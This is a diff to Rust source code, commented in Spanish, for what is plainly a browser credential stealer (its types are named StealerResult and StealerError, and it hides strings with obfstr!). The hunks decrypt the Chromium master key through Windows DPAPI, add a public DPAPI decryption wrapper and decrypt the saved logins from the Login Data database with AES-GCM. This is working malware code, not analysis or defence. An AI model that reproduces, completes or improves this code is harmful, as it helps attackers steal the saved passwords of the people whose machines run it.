@@ -102,12 +102,12 @@ fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8
             
             // Los primeros 5 bytes son "DPAPI", los removemos
             if encrypted_key.len() > 5 && &encrypted_key[0..5] == obfstr!("DPAPI").as_bytes() {
-                let encrypted_without_prefix = &encrypted_key[5..];
+                let _encrypted_without_prefix = &encrypted_key[5..];
                 
                 // Desencriptar usando DPAPI (solo Windows)
                 #[cfg(target_os = "windows")]
                 {
-                    let decrypted = dpapi_decrypt(encrypted_without_prefix)?;
+                    let decrypted = dpapi_decrypt(&encrypted_key[5..])?;
                     return Ok(Some(decrypted));
                 }
                 
@@ -154,6 +154,17 @@ fn dpapi_decrypt(data: &[u8]) -> StealerResult<Vec<u8>> {
     };
 
     Ok(decrypted)
+}
+
+/// Wrapper público para desencriptar con DPAPI (retorna Option para compatibilidad)
+#[cfg(target_os = "windows")]
+pub fn decrypt_value_dpapi(data: &[u8]) -> Option<Vec<u8>> {
+    dpapi_decrypt(data).ok()
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn decrypt_value_dpapi(_data: &[u8]) -> Option<Vec<u8>> {
+    None
 }
 
 /// Extrae credenciales de la base de datos SQLite (Login Data)
@@ -232,10 +243,10 @@ fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<St
     let cipher = Aes256Gcm::new_from_slice(master_key)
         .map_err(|_| StealerError::DecryptionFailed)?;
     
-    let nonce = Nonce::from_slice(nonce_bytes);
+    let nonce = Nonce::clone_from_slice(nonce_bytes);
     
     // Desencriptar
-    let plaintext = cipher.decrypt(nonce, ciphertext_with_tag)
+    let plaintext = cipher.decrypt(&nonce, ciphertext_with_tag)
         .map_err(|_| StealerError::DecryptionFailed)?;
     
     String::from_utf8(plaintext)
